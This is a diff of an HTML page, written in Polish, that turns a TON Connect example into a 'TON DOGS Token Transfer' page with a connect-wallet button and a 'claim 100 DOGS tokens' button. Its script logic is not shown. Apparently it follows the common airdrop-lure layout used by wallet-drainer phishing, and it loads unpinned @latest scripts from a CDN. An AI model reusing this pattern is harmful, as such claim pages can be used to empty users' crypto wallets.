@@ -3,33 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Connect Example</title>
+    <title>TON DOGS Token Transfer</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/ton-core@latest/dist/ton-core.min.js"></script>
+    <script src="https://unpkg.com/ton-web3@latest/dist/ton-web3.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
         }
         button {
-            margin: 20px;
-            padding: 10px 20px;
+            margin: 10px;
+            padding: 12px 24px;
             border: none;
-            border-radius: 5px;
-            background-color: #4CAF50;
-            color: #fff;
+            border-radius: 8px;
+            background-color: #0088CC;
+            color: white;
             cursor: pointer;
+            font-size: 16px;
         }
         button:disabled {
-            opacity: 0.5;
+            background-color: #cccccc;
             cursor: not-allowed;
+        }
+        .token-info {
+            margin: 20px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Aktywuj kontrakt</h1>
-    <div id="ton-connect"></div>
-    <button id="connect-button">Połącz portfel</button>
-    <button id="activate-button" disabled>Aktywuj kontrakt</button>
+    <div class="container">
+        <h1>TON DOGS Token Transfer</h1>
+        <div id="ton-connect"></div>
+        <button id="connect-button">Połącz portfel</button>
+        <div class="token-info" id="token-info">
+            <h2>Informacje o tokenach</h2>
+            <p>Nazwa: DOGS Token</p>
+            <p>Ilość do otrzymania: <span id="token-amount">100</span> DOGS</p>
+            <button id="claim-button" disabled>Odbierz tokeny</button>
+        </div>
+    </div>
     <script src="script.js"></script>
 </body>
 </html>
